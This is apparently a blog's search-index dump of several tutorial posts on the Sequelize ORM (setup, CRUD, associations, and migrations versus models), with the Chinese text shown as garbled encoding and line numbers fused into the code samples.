¹æ“šå‰›å‰›ä¸‹çš„æŒ‡ä»¤ç”¢ç”Ÿçš„ Schema firstName: DataTypes.STRING, lastName: DataTypes.STRING, email: DataTypes.STRING }, { sequelize, modelName: 'User', }); return User;}; å¦‚æœä½ å°ç”¢å‡ºä¾†çš„çµæœä¸æ»¿æ„ï¼Œéƒ½å¯ä»¥åœ¨é€™è£¡åšä¿®æ”¹ã€‚ åŸ·è¡Œ Migration1npx sequelize-cli db:migrate ç°¡å–®ä¾†èªªï¼Œé€™ä¸€æ­¥å°±è·Ÿ sync åœ¨åšçš„äº‹æƒ…ä¸€æ¨£ï¼Œåˆ°é€™è£¡æ‰æ˜¯çœŸæ­£åˆ°è³‡æ–™åº«å»ºç«‹ table æœ€å¾Œä¸Šé¢éƒ½åšå¥½ä»¥å¾Œï¼Œå°±å¯ä»¥ç›´æ¥åœ¨ä½ çš„ JS è£¡é¢ä½¿ç”¨ ORM äº†ï¼š 12345678910// æ‰€æœ‰ model éƒ½æœƒè¢«ç¶åœ¨ db ä¸Šconst { User, Comment } = require('./models');// å»ºç«‹æ–°çš„è³‡æ–™User.create({ firstName: 'PeaNu', lastName: 'yoyo'}).then(() =&gt; { console.log('done');}) å°±é€™éº¼ç°¡å–®å›‰ã€‚ é™„è¨»ï¼šæƒ³è¦æ”¹ Schema çš„è©±è¦æ€éº¼æ”¹è£œæ›´ï¼šæ”¹äº† Migration å¾Œä¸€æ¨£è¦æ”¹ Modelï¼Œä¸ç„¶å¾Œä¾†çš„æ“ä½œæœƒæœ‰ Bugï¼ˆæ‰¾ä¸åˆ°å°æ‡‰æ¬„ä½ï¼Œè®Šæˆç©ºå€¼ï¼‰ å¦‚æœæ˜¯é€é db:migrate çš„æ–¹å¼ä¾†åŒæ­¥è³‡æ–™åº«ï¼Œé‚£å°±è¦å»æ”¹ migration è£¡é¢çš„è³‡æ–™ï¼Œå¼·èª¿ä¸€ä¸‹ï¼š ä¸æ˜¯æ”¹ Model ä¸æ˜¯æ”¹ Model ä¸æ˜¯æ”¹ Model æ”¹ Model åªé©ç”¨åœ¨ sync çš„æƒ…æ³ï¼Œé€™é»è¦ç‰¹åˆ¥æ³¨æ„ã€‚ æ¥è‘—æµç¨‹æ˜¯é€™æ¨£ï¼š å…ˆå»æ”¹ migration ä¸­çš„å…§å®¹ db:migate:undo å…ˆå›åˆ°ä¸Šä¸€å±¤ç‹€æ…‹ db:migate å»ºç«‹æ–°çš„ migration å°±é€™éº¼ç°¡å–®å›‰ï¼","link":"/2022/03/25/sequelize-cli-basic/"},{"title":"Sequelize çš„ CRUD","text":"å‡¡äº‹å¾ CRUD é–‹å§‹ã€‚ æ–°å¢è³‡æ–™Model.create() 123const jane = await User.create({ firstName: \"Jane\", lastName: \"Doe\" });// å»ºç«‹æ™‚çš„ idconsole.log(\"Jane's auto-generated ID:\", jane.id); æ’ˆå‡ºè³‡æ–™Model.findAll() 123// Find all usersconst users = await User.findAll();console.log(\"All users:\", JSON.stringify(users, null, 2)); ä¹Ÿå¯ä»¥æŒ‡å®šè¦å“ªäº›æ¬„ä½ï¼š 1234Model.findAll({ attributes: ['foo', 'bar']});// SELECT foo, bar FROM ... æˆ–åŠ ä¸Š WHEREï¼š 1234567Post.findAll({ where: { authorId: 2 authorId: [2, 3] }});// SELECT * FROM post WHERE authorId = 2; å¦‚æœè¦ä½¿ç”¨ã€Œé‹ç®—å­ã€çš„è©±ï¼š 12345678910// é è¨­å°±æœ‰å¼•å…¥ï¼Œåªæ˜¯å¯«å‡ºä¾†çµ¦ä½ çœ‹const { Op } = require(\"sequelize\");const users = await User.findAll({ where: { id: { [Op.gt]: 2 } }});// SELECT * FROM post WHERE authorId &gt; 2; å…¶ä»–çš„é‹ç®—å­ï¼ˆåªåˆ—æˆ‘æ‡‰è©²æœƒç”¨åˆ°çš„ï¼‰ï¼š 1234567891011121314151617181920212223const { Op } = require(\"sequelize\");Post.findAll({ where: { [Op.and]: [{ a: 5 }, { b: 6 }], // (a = 5) AND (b = 6) [Op.or]: [{ a: 5 }, { b: 6 }], // (a = 5) OR (b = 6) someAttribute: { // Basics [Op.eq]: 3, // = 3 [Op.ne]: 20, // != 20 [Op.is]: null, // IS NULL [Op.not]: true, // IS NOT TRUE [Op.or]: [5, 6], // (someAttribute = 5) OR (someAttribute = 6) // Number comparisons [Op.gt]: 6, // &gt; 6 [Op.gte]: 6, // &gt;= 6 [Op.lt]: 10, // &lt; 10 [Op.lte]: 10, // &lt;= 10 [Op.between]: [6, 10], // BETWEEN 6 AND 10 [Op.notBetween]: [11, 15], // NOT BETWEEN 11 AND 15 } }}); æ›´æ–°è³‡æ–™Model.update() 123456789101112// æŠŠ id &gt;= 2 çš„éƒ½æ”¹å~async function () { const result = await User.update({ firstName: 'peanu'} ,{ where: { id: { [Op.gte]: 2 } } }); // å½±éŸ¿äº†å¹¾æ¬„ console.log(\"affected row:\", result);}() åˆªé™¤è³‡æ–™Model.destroy() 12345678910// æŠŠ id &gt;= 2 çš„éƒ½åˆªæ‰~async function () { const result = await User.destroy({ where: { id: 5 } }) // å½±éŸ¿äº†å¹¾æ¬„ console.log(\"result:\", result);}() æ’åºæƒ³è¦è¨­å®š ORDER BY å¯ä»¥é€™æ¨£è¨­ï¼š 123456789~async function () { const result = await Comment.findAll({ // æ ¹æ“š id é™å†ªæ’åº order: [ ['id', 'DESC'] ] }); console.log(JSON.stringify(result, null, 4));}() å…¶ä»–æ¯”è¼ƒæ–¹ä¾¿çš„å¯«æ³•ç›´æ¥æ ¹æ“š id æœå°‹ï¼ˆæº–ç¢ºä¾†èªªæ˜¯ Primary keyï¼‰ï¼š Model.findByPk() 123456789~async function () { const user = await User.findByPk(1); // æ¥è‘—å°±å¯ä»¥ç›´æ¥å° id=1 çš„ user åšäº‹æƒ…äº† const result = await user.update({ lastName: 'hahaha' }) // è·Ÿ jQuery å¾ˆåƒï¼Œé€™é‚Šé‚„æ˜¯æœƒå›å‚³ userï¼Œè®“ä½ å¯ä»¥ä¸€ç›´éˆçµä¸‹å» console.log('result', result);}() åªæƒ³è¦æ’ˆå‡ºä¸€ç­†è³‡æ–™ï¼š Model.findOne() 12345678910111213~async function () { const user = await User.findOne({ where: { id: 1 } }); // æ¥è‘—å°±å¯ä»¥ç›´æ¥å° id=1 çš„ user åšäº‹æƒ…äº† const result = await user.update({ lastName: 'hahaha' }) // è·Ÿ jQuery å¾ˆåƒï¼Œé€™é‚Šé‚„æ˜¯æœƒå›å‚³ userï¼Œè®“ä½ å¯ä»¥ä¸€ç›´éˆçµä¸‹å» console.log('result', result);}()","link":"/2022/03/25/sequelize-crud/"},{"title":"é‡æ–°ç†è§£ Sequelize ä¸­çš„ Migration å’Œ Model","text":"å¸Œæœ›çœŸçš„æœ‰ææ¸…æ¥šäº†ã€‚ sequelize çš„ migrationç°¡è¿°ä¹‹å‰å¸¸å¸¸æä¸æ¸…æ¥š Model å’Œ Migration ä¹‹é–“ çš„å·®åˆ¥åœ¨å“ªè£¡ï¼Œæ‰€ä»¥é€™é‚Šå…ˆåšå€‹è§£èªªã€‚ Model æ­¸ Modelï¼ŒMigation æ­¸ Migrationï¼Œå®ƒå€‘æ˜¯ç¨ç«‹çš„å…©å€‹æ±è¥¿ã€‚ é—œæ–¼ Modelé¦–å…ˆï¼ŒModel åªæ˜¯ç”¨ä¾†è¨­å®šä½ è¦ç”¨ JS æ“ä½œæ™‚çš„è³‡æ–™çµæ§‹ï¼Œä¾‹å¦‚ä¸‹é¢é€™å€‹ Post çš„ Modelï¼š 123456789101112131415161718192021222324'use strict';const { Model} = require('sequelize');module.exports = (sequelize, DataTypes) =&gt; { class Post extends Model { static associate(models) { // åŠ äº†é€™æ®µå¾Œæ‰å¯ä»¥ç”¨ã€Œincludeã€é€™å€‹å±¬æ€§ Post.belongsTo(models.Category) } } // å¯ä»¥å°é€™å€‹ Model æ“ä½œçš„è³‡æ–™çµæ§‹ Post.init({ title: DataTypes.STRING, preview: DataTypes.TEXT, content: DataTypes.TEXT, CategoryId: DataTypes.INTEGER, isDeleted: DataTypes.BOOLEAN }, { sequelize, modelName: 'Post', }); return Post;}; èˆ‰ä¾‹ä¾†èªªï¼Œå¦‚æœç¾åœ¨æŠŠ Model çš„ title æ‹¿æ‰ï¼Œé‚£éº¼å°±ç®—ä½ çš„ Table è£¡é¢æœ‰ title æ¬„ä½ï¼Œä½ ä¹Ÿæ²’è¾¦æ³•ç”¨ JS å»å­˜å–ï¼Œå› ç‚ºä½ æ²’æŠŠå®ƒå®šç¾©åœ¨ Model è£¡é¢ï¼Œé€™å°±æ˜¯æˆ‘ä»¥å‰æ‰è¸©åˆ° é€™å€‹ Bug çš„åŸå› ã€‚ é—œæ–¼ Migrationé—œæ–¼ Migration çš„æ„æ€ï¼Œæˆ‘è‡ªå·±æ˜¯æƒ³æˆã€Œé€™å€‹æª”æ¡ˆåœ¨å°è³‡æ–™åº«åšä»€éº¼ï¼Ÿï¼ˆæˆ–æ˜¯è³‡æ–™åº«è©²æ€éº¼è®Šçš„è…³æœ¬ï¼‰ã€ä¾†è¨˜ã€‚ æ­¤è©±æ€è¬›ï¼Ÿä¾†èˆ‰å€‹ä¾‹å­ã€‚ ä½ ä¸€é–‹å§‹æ‡‰è©²éƒ½æœƒç”¨ npx sequelize-cli model:generate --name Model ä¾†å»ºç«‹ Model çš„åŸºæœ¬çµæ§‹ï¼Œé€™æ™‚å€™æœƒ Sequelize æœƒé †ä¾¿ç”¢ç”Ÿä¸€å€‹ Migationï¼Œæ²’æ„å¤–æ‡‰è©²æœƒå«åš &lt;date&gt;-create-&lt;model&gt;.js çš„åç¨±ï¼Œè€Œå®ƒçš„å…§å®¹æ‡‰è©²æœƒé•·å¾—åƒé€™æ¨£ï¼š 1234567891011121314151617181920212223242526272829'use strict';module.exports = { // db:migrate åŸ·è¡Œé€™æ®µ async up(queryInterface, Sequelize) { await queryInterface.createTable('Categories', { id: { allowNull: false, autoIncrement: true, primaryKey: true, type: Sequelize.INTEGER }, name: { type: Sequelize.STRING }, createdAt: { allowNull: false, type: Sequelize.DATE }, updatedAt: { allowNull: false, type: Sequelize.DATE } }); }, // db:migrate:undo åŸ·è¡Œé€™æ®µ async down(queryInterface, Sequelize) { await queryInterface.dropTable('Categories'); }}; ä»”ç´°çœ‹ä½ æœƒç™¼ç¾å®ƒå…¶å¯¦åªæ˜¯ä¸€å€‹ç”¨ JS ä¾†åŸ·è¡Œ SQL çš„å…§å®¹ï¼Œç•¶åŸ·è¡Œ db:migrate æ™‚æœƒåŸ·è¡Œåˆ° upï¼›åŸ·è¡Œ db:migrate:undo æ™‚æœƒåŸ·è¡Œåˆ° downã€‚ æ‰€ä»¥é€™å€‹ Migration å°±å¯ä»¥çœ‹æˆæ˜¯ã€Œåˆ°è³‡æ–™åº«å»ºç«‹ tableã€çš„æª”æ¡ˆï¼Œä½ è¦å»º table å°±åŸ·è¡Œ db:migrateï¼Œè¦åˆªé™¤å°±åŸ·è¡Œ db:migrate:undoï¼Œå°±æ˜¯é€™éº¼ç°¡å–®ï¼ é‚£ç‚ºä»€éº¼å¸¸å¸¸æœƒèªªå®ƒæ˜¯ä¸€ç¨®ã€Œç‰ˆæœ¬ç´€éŒ„ã€ï¼Ÿå› ç‚ºä½ ä¸€çœ‹ Migration å°±èƒ½çŸ¥é“ã€Œåœ¨ä»€éº¼æ™‚é–“é»å°è³‡æ–™åº«åšäº†ä»€éº¼æ”¹è®Šã€ï¼Œåƒä¸Šé¢çš„ &lt;date&gt;-create-&lt;model&gt;.js å°±æ˜é¡¯ä»£è¡¨ã€Œæˆ‘åœ¨æŸå€‹æ™‚é–“é»å°è³‡æ–™åº«å»ºç«‹äº†ä¸€å€‹ Tableã€ã€‚ èˆ‰ä¾‹ä¾†èªªï¼Œå¦‚æœæˆ‘ç¾åœ¨å° Table æ–°å¢äº†ä¸€äº›æ¬„ä½æˆ–æ˜¯ä¿®æ”¹ï¼Œé‚£æˆ‘ä¹Ÿæœƒæœ‰æ–°çš„ migrationï¼Œå¯èƒ½å«åš modify_users_add_new_fields ä¹‹é¡çš„ï¼Œä¸€ç›®äº†ç„¶ã€‚ ç•¶ä½ æœ‰ä¸€å¤§å † Migation çš„æ™‚å€™å¯èƒ½æœƒåƒé€™æ¨£ï¼š 12345678910111213141520190329025948-create-user.js -&gt; å»ºç«‹ user é€™å€‹ table20190329054042-create-announcement.js -&gt; å»ºç«‹ announcement é€™å€‹ table20190329071502-create-progression.js -&gt; å»ºç«‹ progression é€™å€‹ table20190329080415-create-report.js -&gt; å»ºç«‹ report é€™å€‹ table20200328083208-update-user-role.js -&gt; ä¿®æ”¹ user é€™å€‹ table20200329094946-create-homework.js -&gt; å»ºç«‹ homework é€™å€‹ table20200423131738-update-user-status.js -&gt; ä¿®æ”¹ user é€™å€‹ table20200503085305-update-homeworks-like.js -&gt; ä¿®æ”¹ homework é€™å€‹ table20210316055432-create-unit_permissions.js -&gt; å»ºç«‹ unit_permissions é€™å€‹ table20210316063420-create-note.js -&gt; å»ºç«‹ note é€™å€‹ table20210405132446-create-syllabus.js -&gt; å»ºç«‹ syllabus é€™å€‹ table20210530085648-update-user-transaction.js -&gt; ä¿®æ”¹ user é€™å€‹ table20210530090402-create-transaction.js -&gt; å»ºç«‹ transaction é€™å€‹ table20210804121734-create-article.js -&gt; å»ºç«‹ article é€™å€‹ table20210804121758-create-comment.js -&gt; å»ºç«‹ comment é€™å€‹ table ï¼ˆå¼•è‡ª Lidemy çš„å­¸ç¿’ç³»çµ±ï¼‰ åä¹‹ï¼Œå¦‚æœæ²’æœ‰ Migration çš„è©±ï¼Œæˆ‘å°±é€é git çš„ commit ç´€éŒ„ä¸€å€‹å€‹å»çœ‹ Model çš„å…§å®¹æ˜¯åœ¨ä»€éº¼æ™‚å€™è¢«æ”¹çš„ï¼Œéå¸¸éå¸¸éå¸¸éº»ç…©å§ï¼Ÿæ‰€ä»¥é€™å°±æ˜¯ Migration çš„ç”¨é€”ã€‚ ä»¥ä¸Šå°±æ˜¯ Model è·Ÿ Migration çš„å·®åˆ¥ï¼Œä¸çŸ¥é“æˆ‘èªªæ¸…æ¥šäº†æ²’æœ‰ï¼Œä½†å¸Œæœ›èƒ½å¹«åŠ©è·Ÿæˆ‘ä¸€æ¨£å¡å¾ˆä¹…çš„äººè§£æƒ‘ã€‚","link":"/2022/03/31/sequelize-migration-and-model-difference/"},{"title":"Sequelize éš¨ç­†è¨˜","text":"çœŸçš„éš¨ç­†è¨˜ã€‚ Table åšå£äº†æƒ³é‡æ–°é–‹ å…ˆæ’¤éŠ·æ‰€æœ‰çš„ migation 1npx sequelize-cli migrate:undo:all é‡æ–°å»ºç«‹ 1npx sequelize-cli db:migrate ä¸€äº›è¨­å®š Model æ™‚æœƒç”¨åˆ°çš„å±¬æ€§12345autoIncrement: true // éå¢allowNull: false // ç©ºå€¼primaryKey: true // ä¸»éµunique: true // å”¯ä¸€éµdefaultValue: false // åˆå§‹å€¼ï¼ˆå¸ƒæ—å€¼ï¼‰ ä¸€äº›è·Ÿ Model æ“ä½œç›¸é—œçš„ methodsæ‰¾ç¸½æ•¸é‡1234567891011Post.count({ where: { title: '123' }}).then(post =&gt; { console.log('success', post);}).catch(err =&gt; { console.log('failed', err);}) å°è¢« include çš„ model åš where æŸ¥è©¢12345678const category = await Category.findOne({ where: { id }, include: [{ model: Post, // å¯«åœ¨é€™è£¡ where: { isDeleted: 0 }, }],}); å°è¢« include çš„ model åš order æ’åº12345678910const category = await Category.findOne({ where: { id }, // è¨˜å¾—æ˜¯å¯«åœ¨å¤–é¢ä¸æ˜¯è£¡é¢ï¼š // Model åç¨±ã€æ ¹æ“šä»€éº¼ä¾†æ’åºã€å‡å†ªé‚„é™å†ª order: [[Post, 'id', 'DESC']], include: [{ model: Post, where: { isDeleted: 0 }, }],}); å°è¢« include çš„ model åš offset å’Œ limitå»ºè­°åŠ ä¸Šä¸€å€‹ separate çš„å±¬æ€§ï¼Œä¸ç„¶å·¢ç‹€æœ‰æ™‚å€™æœƒæœ‰ bugï¼š 1234567891011const category = await Category.findOne({ where: { id }, include: [{ model: Post, where: { isDeleted: 0 }, separate : true, // &lt;-- é€™å€‹å¾ˆé‡è¦ order: [['createdAt', 'DESC']], limit, offset }],});","link":"/2022/03/30/sequelize-note/"},{"title":"ä½¿ç”¨ Sequelize çš„äº‹å‰æº–å‚™","text":"å¥½ç”¨çš„æ±è¥¿ï¼Œä¸éå¾—å¤šç·´ç¿’ã€‚ ç°¡è¿°åŸºæœ¬æµç¨‹å¤§è‡´éƒ½æ˜¯é€™æ¨£ï¼š é€£ç·šåˆ°è³‡æ–™åº« å®šç¾© Table çš„ Schemaï¼Œï¼ˆSequelize æœƒç”¨ Model ä¾†ç¨±å‘¼ï¼‰ åŒæ­¥åˆ°è³‡æ–™åº«ï¼ˆçœŸæ­£æ–°å»º Table çš„å‹•ä½œï¼‰ é€£ç·šåˆ°è³‡æ–™åº«é™„è¨»ï¼šä¸€å€‹ Sequelize å°±ä»£è¡¨ä¸€å€‹è³‡æ–™åº«ï¼Œå¯ä»¥é€™æ¨£è¨˜ã€‚ 12345678910111213141516171819// Sequelize: ç”¨ä¾† new ä¸€å€‹é€£ç·šè³‡æ–™åº«çš„ instance// DataTypes: ç”¨ä¾†è¨­å®š Schema çš„å…§å®¹const { Sequelize, DataTypes } = require('sequelize');// åŸºæœ¬è³‡è¨Šconst sequelize = new Sequelize('database', 'username', 'password', { host: 'localhost', dialect: 'mariadb'});// æª¢æŸ¥é€£ç·šç‹€æ…‹~async function checkConnection () { try { await sequelize.authenticate(); console.log('Connection has been established successfully.'); } catch (error) { console.error('Unable to connect to the database:', error); }}() å®šç¾© Schemaé™„è¨»ï¼š Sequelize è£¡æœƒç”¨ã€ŒModelã€ä¾†è¡¨ç¤º table Sequelize é è¨­å°±æœƒæœ‰ã€Œæ™‚é–“è»¸ã€çš„æ¬„ä½ï¼Œä¸ç”¨è‡ªå·±å¯« STRING çš„é è¨­å€¼æ˜¯ VARCHAR(255) 123456789101112// å®šç¾©ä¸€å€‹ User çš„ tableï¼ˆå¤§å¯«æ˜¯å‘½åæ…£ä¾‹ï¼‰const User = sequelize.define('User', { // è¨­å®šæ¬„ä½è³‡è¨Š firstName: { type: DataTypes.STRING, allowNull: false }, lastName: { type: DataTypes.STRING // allowNull defaults to true }}) è©³ç´°çš„çµæ§‹åƒè€ƒä¸‹é¢ï¼š Stringï¼š 1234567DataTypes.STRING // VARCHAR(255)DataTypes.STRING(1234) // VARCHAR(1234)DataTypes.STRING.BINARY // VARCHAR BINARYDataTypes.TEXT // TEXTDataTypes.TEXT('tiny') // TINYTEXTDataTypes.CITEXT // CITEXT PostgreSQL and SQLite only.DataTypes.TSVECTOR // TSVECTOR PostgreSQL only. Booleanï¼š 1DataTypes.BOOLEAN // TINYINT(1) Numberï¼š 123456789101112131415161718DataTypes.INTEGER // INTEGERDataTypes.BIGINT // BIGINTDataTypes.BIGINT(11) // BIGINT(11)DataTypes.FLOAT // FLOATDataTypes.FLOAT(11) // FLOAT(11)DataTypes.FLOAT(11, 10) // FLOAT(11,10)DataTypes.REAL // REAL PostgreSQL only.DataTypes.REAL(11) // REAL(11) PostgreSQL only.DataTypes.REAL(11, 12) // REAL(11,12) PostgreSQL only.DataTypes.DOUBLE // DOUBLEDataTypes.DOUBLE(11) // DOUBLE(11)DataTypes.DOUBLE(11, 10) // DOUBLE(11,10)DataTypes.DECIMAL // DECIMALDataTypes.DECIMAL(10, 2) // DECIMAL(10,2) åŒæ­¥åˆ° Databaseä¸Šé¢éƒ½åªæ˜¯äº‹å‰æº–å‚™ï¼Œé‚„æ²’æœ‰çœŸæ­£å»æ“ä½œè³‡æ–™åº«ï¼Œæ‰€ä»¥é€™ä¸€æ­¥æ‰ç®—æ˜¯çœŸçš„åŸ·è¡Œ SQL æŒ‡ä»¤ã€‚ 1234~async function sync() { // æ ¹æ“šå‰é¢å®šç¾©çš„ Model ä¾†åŒæ­¥ await sequelize.sync();}() å¦‚æœä¹‹å¾Œæƒ³è¦æ”¹ Schemaï¼Œå°±è·Ÿå‰›å‰›ä¸€æ¨£çš„æµç¨‹ï¼š å…ˆä¿®æ”¹ Model å†åŸ·è¡Œä¸€æ¬¡ sync","link":"/2022/03/25/sequelize-preparation/"},{"title":"Sequelize å»ºç«‹é—œè¯","text":"æŠŠä½ æˆ‘ä¹‹é–“é€£èµ·ä¾†ã€‚ å»ºç«‹æ–¹å¼å‡è¨­æˆ‘æœ‰å…©å€‹ tableï¼š 12345678910111213141516171819// å®šç¾©ä¸€å€‹ User çš„ tableconst User = sequelize.define('User', { // è¨­å®šæ¬„ä½è³‡è¨Š firstName: { type: DataTypes.STRING, allowNull: false }, lastName: { type: DataTypes.STRING }})// å®šç¾©ä¸€å€‹ Comment çš„ tableconst Comment = sequelize.define('Comment', { // è¨­å®šæ¬„ä½è³‡è¨Š content: { type: DataTypes.STRING, allowNull: false }}) æ¥è‘—å°±å¯ä»¥ç”¨ä¸€äº› method ä¾†æŠŠå®ƒå€‘é—œè¯èµ·ä¾†ï¼š 1234// ä¸€å€‹ user å°æ‡‰åˆ°å¤šå€‹ commentï¼ˆä¸€å°å¤šï¼‰User.hasMany(Comment);// ä¸€å€‹ comment å±¬æ–¼ä¸€å€‹ userï¼ˆä¸€å°ä¸€ï¼‰Comment.belongsTo(User); é€šå¸¸ä¸€å€‹ has å°±æœƒå°æ‡‰åˆ°ä¸€å€‹ belongsTo æ‰€ä»¥å¯ä»¥æœ‰é€™å¹¾ç¨®å¯«æ³•ï¼š ä¸€å°ä¸€ï¼šhasOne å° belongsTo ä¸€å°å¤šï¼šhasMany å° belongsToï¼ˆæœ€å¸¸ç”¨ï¼‰ å¤šå°å¤šï¼šbelongsToMany ç¸½ä¹‹ï¼Œåªè¦ä½ å»ºç«‹äº†é—œè¯ï¼ŒSequelize å°±æœƒè‡ªå‹•å¹«ä½ åœ¨é—œè¯çš„ table åŠ ä¸Šã€Œå¤–éµï¼ˆForeign keyï¼‰ã€ï¼Œé è¨­å€¼æ˜¯Modelåç¨± + Idã€‚ å¦‚æœä½ æƒ³è‡ªå®šç¾©çš„è©±å¯ä»¥åœ¨è¨­å®šæ™‚å‚³å…¥ Optionï¼š 123User.hasMany(Comment, { foreignKey: 'yoyoyoUserId'}); åˆä½µè³‡æ–™æ¥è‘—å°±æ˜¯æœ€é‡è¦çš„åˆä½µï¼Œç›´æ¥ä¾†çœ‹æ€éº¼ç”¨ã€‚å‡è¨­æˆ‘æƒ³æ’ˆå‡º username=peanu çš„æ‰€æœ‰ç•™è¨€ï¼š 12345678910~async function () { const result = await User.findOne({ where: { firstName: 'peanu' }, // æŠŠè¦åˆä½µçš„ Model include é€²ä¾† include: [Comment] }) console.log(JSON.stringify(result, null, 4));}() è¼¸å‡ºçµæœï¼š 123456789101112131415161718192021222324{ \"id\": 2, \"firstName\": \"peanu\", \"lastName\": \"qq\", \"createdAt\": \"2022-03-24T13:43:16.000Z\", \"updatedAt\": \"2022-03-24T14:10:43.000Z\", // peanu çš„æ‰€æœ‰ç•™è¨€ \"Comments\": [ { \"id\": 2, \"content\": \"yoyoyo\", \"createdAt\": \"2022-03-24T15:06:52.000Z\", \"updatedAt\": \"2022-03-24T15:06:52.000Z\", \"UserId\": 2 }, { \"id\": 3, \"content\": \"hello\", \"createdAt\": \"2022-03-24T15:07:03.000Z\", \"updatedAt\": \"2022-03-24T15:07:03.000Z\", \"UserId\": 2 } ]} Sequelize å°±æœƒè‡ªå‹•æ–°å¢ä¸€å€‹ Comments çš„æ¬„ä½ï¼Œä»£è¡¨é€™å€‹äººçš„æ‰€æœ‰ç•™è¨€ã€‚ ç•¶ç„¶ä¹Ÿå¯ä»¥åéä¾†ï¼Œå‡è¨­æˆ‘æƒ³æ’ˆå‡ºæŸå€‹ Comment çš„ User è³‡æ–™ï¼š 12345678910~async function () { const result = await Comment.findOne({ where: { id: 6 }, // ä¸€æ¨£ç”¨ includeï¼Œåªæ˜¯èº«åˆ†äº’æ› include: [User] }) console.log(JSON.stringify(result, null, 4));}() è¼¸å‡ºçµæœï¼š 1234567891011121314{ \"id\": 6, \"content\": \"bobo\", \"createdAt\": \"2022-03-24T15:07:36.000Z\", \"updatedAt\": \"2022-03-24T15:07:36.000Z\", \"UserId\": 1, \"User\": { \"id\": 1, \"firstName\": \"John\", \"lastName\": \"hahaha\", \"createdAt\": \"2022-03-24T13:29:05.000Z\", \"updatedAt\": \"2022-03-24T14:19:39.000Z\" }} é€™æ¨£æˆ‘å€‘å°±å¯ä»¥çŸ¥é“ id=6 çš„ç•™è¨€æ˜¯ John ç•™çš„äº†ã€‚","link":"/2022/03/25/sequelize-relation/"},{"title":"Sequelize é€é Migration ä¾†ä¿®æ”¹ Table è³‡è¨Š","text":"èŠ±äº†ä¸€é»æ™‚é–“æ‰ç†è§£é€™å€‹æµç¨‹ã€‚ ç°¡è¿°ä¸çŸ¥é“ä½ æœ‰æ²’æœ‰å’Œæˆ‘ä¸€æ¨£ï¼Œæ›¾ç¶“æƒ³è¦å° Table æ–°å¢æ¬„ä½ï¼Œæ‰€ä»¥å°±ç›´æ¥é€™æ¨£å­åšï¼š 12345678910111213141516171819202122232425262728293031// 20220331071729-create-category.js'use strict';module.exports = { async up(queryInterface, Sequelize) { await queryInterface.createTable('Categories', { id: { allowNull: false, autoIncrement: true, primaryKey: true, type: Sequelize.INTEGER }, name: { type: Sequelize.STRING }, isDeleted: { // &lt;- æ–°å¢é€™å€‹æ¬„ä½ type: Sequelize.BOOLEAN }, createdAt: { allowNull: false, type: Sequelize.DATE }, updatedAt: { allowNull: false, type: Sequelize.DATE } }); }, async down(queryInterface, Sequelize) { await queryInterface.dropTable('Categories'); }}; é€™æ™‚å€™ä½ å»åŸ·è¡Œ npx sequelize-cli db:migrate æœƒç™¼ç¾æ²’æœ‰ç”¨ï¼š 123Loaded configuration file \"config\\config.json\".Using environment \"development\".No migrations were executed, database schema was already up to date. é€™ç¨®æ™‚å€™è©²æ€éº¼è¾¦ï¼Ÿä½ æœ‰å…©æ¢è·¯å¯ä»¥èµ°ï¼š åŸ·è¡Œ db:migrate:undoï¼Œæ¥è‘—å†é‡æ–°è·‘ä¸€æ¬¡ db:migrate åŸ·è¡Œ db:migration:createï¼Œå¯«ä¸€å€‹æ–°çš„ migration ä¾†è™•ç† é€™å…©å€‹å·®åœ¨ç¬¬ä¸€ç¨®æœƒç›´æ¥æŠŠ Table Drop æ‰ï¼ˆé€šå¸¸æ˜¯é€™æ¨£ï¼Œä½†å¯¦éš›ä¸Šçœ‹å…§å®¹æ±ºå®šï¼‰ï¼Œä½ åŸæœ¬å­˜çš„è³‡æ–™å°±ç›´æ¥æ²’äº†ï¼Œè€Œç¬¬äºŒç¨®å°±æ˜¯ç‚ºäº†é¿å…é€™å€‹å•é¡Œçš„è§£æ±ºæ–¹æ¡ˆï¼Œä¹Ÿæ˜¯æˆ‘é€™ç¯‡è¦è¬›çš„è§£æ³•ã€‚ å‡è¨­æˆ‘ç›®å‰çš„ Table é•·é€™æ¨£ï¼š ç¾åœ¨æˆ‘æƒ³å°æ–°å¢ä¸€å€‹ isDeleted æ¬„ä½ï¼Œæ‰€ä»¥å°±ç…§å‰›å‰›èªªçš„ï¼Œæˆ‘å…ˆä¸‹æŒ‡ä»¤ä¾†ç”Ÿä¸€å€‹æ–°çš„ Migration å‡ºä¾†ï¼š 12# å‘½åæ…£ä¾‹æœ€å¥½æ˜¯ update create add .. ä¹‹é¡çš„ç•¶ä½œé–‹é ­sequelize migration:create --name 'add-isDeleted-to-category' æ¥è‘—ç”¢ç”Ÿçš„æª”æ¡ˆå…§å®¹æœƒæ˜¯é€™æ¨£ï¼š 123456789101112131415161718192021'use strict';module.exports = { async up (queryInterface, Sequelize) { /** * Add altering commands here. * * Example: * await queryInterface.createTable('users', { id: Sequelize.INTEGER }); */ }, async down (queryInterface, Sequelize) { /** * Add reverting commands here. * * Example: * await queryInterface.dropTable('users'); */ }}; ç°¡å–®ä¾†èªªï¼Œå°±æ˜¯åœ¨è£¡é¢å¯«ä½ æƒ³åŸ·è¡Œçš„æ“ä½œï¼š 12345678910111213141516171819202122'use strict';module.exports = { async up (queryInterface, Sequelize) { // ç”¨ addColumn æ–°å¢ await queryInterface.addColumn( 'Categories', // table name 'isDeleted', // new field name // dataType { type: Sequelize.BOOLEAN, allowNull: false, defaultValue: false } ) }, async down (queryInterface, Sequelize) { // ç”¨ removeColumn æ–°å¢ await queryInterface.removeColumn('Categories', 'isDeleted'); }}; è¨˜å¾— up å’Œ down ä¹‹é–“è¦æœ‰å°æ‡‰é—œä¿‚ï¼Œæˆ‘åœ¨ up è£¡åšæ–°å¢ï¼Œdown å°±æ‡‰è©²è©²åšç§»é™¤ï¼Œé€™æ¨£ä¹‹å¾Œè·‘æŒ‡ä»¤çš„æ™‚æ‰ä¸æœƒå‡ºéŒ¯ã€‚ æ¥ä¸‹ä¾†å°±è·Ÿä¸€é–‹å§‹ä¸€æ¨£ï¼Œä¸‹æŒ‡ä»¤å»è·‘ migrationï¼š 1npx sequelize-cli db:migrate é€™æ¨£å°±å®Œç¾çš„ä¿ç•™è³‡æ–™ï¼Œä¹Ÿæ–°å¢äº†æ¬„ä½ï¼Œå¯å–œå¯è³€ï¼Œå¯å–œå¯è³€ã€‚ ä¹‹å¾Œå¦‚æœåˆä¸æƒ³è¦é€™å€‹æ¬„ä½çš„è©±ä¹Ÿå¾ˆç°¡å–®ï¼Œåªè¦åŸ·è¡Œï¼š 1npx sequelize-cli db:migrate:undo --name 20220331082106-add-isDeleted-to-category.js 